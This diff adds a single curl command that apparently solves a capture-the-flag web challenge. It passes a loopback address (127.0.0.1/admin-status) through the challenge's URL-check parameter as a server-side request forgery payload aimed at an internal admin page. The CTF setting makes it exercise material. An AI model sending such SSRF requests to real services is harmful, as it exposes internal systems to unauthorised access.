@@ -1,0 +1,11 @@
+curl 'http://urlcheck1.chal.ctf.westerns.tokyo/check-status?url=http://127.0.0.1/admin-status' \
+  -H 'Connection: keep-alive' \
+  -H 'Pragma: no-cache' \
+  -H 'Cache-Control: no-cache' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36' \
+  -H 'DNT: 1' \
+  -H 'Accept: */*' \
+  -H 'Referer: http://urlcheck1.chal.ctf.westerns.tokyo/' \
+  -H 'Accept-Language: en-US,en;q=0.9,la;q=0.8' \
+  --compressed \
+  --insecure
